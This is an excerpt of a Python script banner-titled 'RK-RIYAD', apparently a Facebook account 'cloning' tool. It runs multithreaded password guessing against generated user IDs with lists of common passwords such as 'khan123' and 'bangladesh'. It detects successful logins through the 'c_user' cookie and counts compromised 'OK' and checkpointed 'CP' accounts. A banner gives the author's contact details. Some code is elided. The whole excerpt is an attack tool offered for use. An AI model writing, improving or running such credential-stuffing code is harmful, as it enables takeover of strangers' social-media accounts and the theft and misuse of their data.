...
8888888b.  888    d8P        8888888b.  8888888 Y88b   d88P     d8888 8888888b.  
888   Y88b 888   d8P         888   Y88b   888    Y88b d88P     d88888 888  "Y88b 
888    888 888  d8P          888    888   888     Y88o88P     d88P888 888    888 
888   d88P 888d88K           888   d88P   888      Y888P     d88P 888 888    888 
8888888P"  8888888b          8888888P"    888       888     d88P  888 888    888 
888 T88b   888  Y88b  888888 888 T88b     888       888    d88P   888 888    888 
888  T88b  888   Y88b        888  T88b    888       888   d8888888888 888  .d88P 
888   T88b 888    Y88b       888   T88b 8888888     888  d88P     888 8888888P"  
 ...
 \033[1;32m  â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 \033[1;32m  â•‘ðŸ˜ˆ[â€¢] Facebook' : MD Riyadul Momin   
\033[1;32m   â•‘ðŸ˜ˆ[â€¢] Whatsapp' : +17867244875
 \033[1;32m  â•‘ðŸ˜ˆ[â€¢] Github    : https://github.com/Rk-Black/
 \033[1;32m  â•‘ðŸ˜ˆ[â€¢] Status    : FREE            
  \033[1;32m â•‘ðŸ˜ˆ[â€¢] Network   : 3G, 4G/5G,WIFI ON       
 \033[1;32m  â•‘ðŸ˜ˆ[â€¢] Version   : 9.0               
 \033[1;32m  â•‘ðŸ˜ˆ[â€¢] Tools     : Rk-Random-OK             
 \033[1;32m  â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"""
clear()
os.system("https://youtube.com/channel/UCo8W7dLKHTgyN4y26Ly3uOQ")
xxxx = str(len(ugen))
...
def pass4():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'khankhan','khan khan','khan123','khan12','khan1122','bangladesh','mim123','88776655','sadia123','abdullah']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def pass6():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['khankhan','malikmalik','malik123','malik12','malik786','khuda1']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[âˆš] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SNIGDHO] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
